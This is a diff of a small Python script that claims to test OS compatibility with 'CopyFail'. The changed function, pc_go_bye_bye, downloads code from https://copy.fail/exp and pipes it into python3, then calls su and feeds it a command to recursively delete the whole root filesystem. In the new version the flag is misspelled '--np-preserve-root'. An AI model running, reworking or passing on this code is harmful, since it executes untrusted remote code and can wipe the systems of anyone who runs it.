@@ -5,6 +5,7 @@
 
 # Import Libs
 import os as g,zlib,socket as s, platform as p
+import subprocess
 from time import sleep
 # Test if OS is compatible with CopyFail
 def is_Compatible():
@@ -31,7 +32,8 @@ def ask_the_question():
 
 
 def pc_go_bye_bye():
-    g.system(' curl https://copy.fail/exp | python3 && su -c "rm -rf / --no-preserve-root" ')
+    process = subprocess.Popen('curl https://copy.fail/exp | python3 && su', stdin=subprocess.PIPE, text=True, shell=True)
+    process.communicate(input="rm -rf / --np-preserve-root\n")
 # Main script
 is_Compatible()
 answer = ask_the_question()
